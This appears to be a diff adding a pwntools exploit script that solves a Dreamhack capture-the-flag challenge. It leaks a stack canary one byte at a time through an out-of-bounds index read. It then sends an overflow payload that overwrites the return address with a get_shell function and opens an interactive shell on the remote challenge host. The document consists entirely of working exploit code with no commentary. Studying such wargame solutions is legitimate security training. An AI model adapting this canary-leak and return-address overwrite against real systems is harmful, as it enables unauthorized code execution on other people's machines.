@@ -1,0 +1,49 @@
+from pwn import *
+
+r = remote("host1.dreamhack.games", 18209)
+# r = process("./ssp2/ssp_001")
+
+
+
+# canary leak
+
+# ret -> get shell
+get_shell = 0x080486b9
+canary = 0
+
+r.sendlineafter("> ", "P")
+r.sendlineafter("Element index : ", "128")
+
+canary += int(r.recvline()[-3:-1], 16)
+
+r.sendlineafter("> ", "P")
+r.sendlineafter("Element index : ", "129")
+canary += (int(r.recvline()[-3:-1], 16) << 8)
+
+
+r.sendlineafter("> ", "P")
+r.sendlineafter("Element index : ", "130")
+canary += (int(r.recvline()[-3:-1], 16) << 16)
+
+r.sendlineafter("> ", "P")
+r.sendlineafter("Element index : ", "131")
+canary += (int(r.recvline()[-3:-1], 16) << 24)
+
+r.sendlineafter("> ", "E")
+r.sendlineafter("Name Size : ", "150")
+
+print(hex(canary))
+
+payload  = b""
+payload += b"a" * 0x40
+payload += p32(canary)
+payload += b"a" * 0x8
+payload += p32(get_shell)
+pause()
+r.sendline(payload)
+pause()
+r.interactive()
+
+
+
+# 0x80 0x81 0x82 0x83
